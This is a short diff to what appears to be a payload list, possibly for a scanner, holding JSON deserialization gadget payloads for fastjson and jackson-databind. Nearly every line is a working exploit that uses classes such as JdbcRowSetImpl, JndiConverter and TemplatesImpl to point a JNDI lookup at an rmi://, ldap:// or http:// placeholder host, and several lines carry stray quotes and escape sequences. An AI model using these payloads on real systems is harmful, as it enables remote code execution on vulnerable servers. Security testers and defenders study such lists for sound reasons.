@@ -859,7 +859,7 @@ __invoke()
 
 {"name": {"@type":"java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"x": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": rmi://fastjson_1.2.47.localhost/fastjson_1.2.47","autoCommit": true}}}
 
-{"@type": "org.apache.xbean.propertyeditor.JndiConverter","AsText": "rmi://fastjson_1.2.62.localhost/fastjson_1.2.62"}
+{"@type": "org.apache.xbean.propertyeditor.JndiConverter","asText": "ldap://fastjson_1.2.62.localhost/fastjson_1.2.62"}
 
 {"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory ","dataSourceName": "rmi://fastjson_1.2.62_2.localhost/fastjson_1.2.62_2"}
 
@@ -891,10 +891,15 @@ __invoke()
 
 {"param": ["org.apache.openjpa.ee.WASRegistryManagedRuntime",{"registryName": "ldap://jackson_databind_11113.localhost/jackson_databind_11113"}]}
 
-param=["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation": "rmi://jackson_databind_12834.localhost/jackson_databind_12834"}]
+{"param": ["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation": "rmi://jackson_databind_12834.localhost/jackson_databind_12834"}]}
 
 {"param": ["org.springframework.context.support.FileSystemXmlApplicationContext","http://jackson_databind_7525.localhost/jackson_databind_7525"]}
 
+{"param": ["org.apache.xbean.propertyeditor.JndiConverter", {"asText":"ldap://jackson_2020_8840.localhost/jackson_2020_8840"}]}
+
+{"param": ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes": ["http://jackson_databind_Num1.localhost/jackson_databind_Num1"],\n"transletName": "a.b","outputProperties": {}\n}\n]\n}'
+    
+{"param": ["br.com.anteros.dbcp.AnterosDBCPDataSource",{"metricRegistry":"ldap://jackson_databind_24616/jackson_databind_24616"}]}',
 
 ```
 
